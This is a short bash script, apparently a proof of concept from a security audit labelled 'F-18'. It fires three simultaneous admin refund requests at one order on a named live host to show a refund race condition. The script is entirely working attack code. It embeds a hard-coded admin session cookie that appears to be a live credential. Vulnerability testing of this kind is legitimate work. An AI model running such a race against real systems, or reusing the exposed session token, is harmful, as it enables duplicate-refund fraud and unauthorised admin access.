#!/bin/bash
# Runtime refund race: 3 concurrent admin refunds on the same order (F-18 runtime proof)
set -u
OID="$1"
CK="chart_admin=8b12ecfd10326d01044deddb5e213c91304ff1873fd1e6068da4c2ca4de91f5b"
pids=()
for i in 1 2 3; do
  curl -s -o /tmp/refund_race_$i.txt -w "call$i:%{http_code} " -X POST -b "$CK" \
    "https://chart.negar.io/api/admin/orders/$OID/refund" &
  pids+=($!)
done
for p in "${pids[@]}"; do wait "$p"; done
echo ""
for i in 1 2 3; do echo "call$i body: $(head -c 120 /tmp/refund_race_$i.txt)"; done
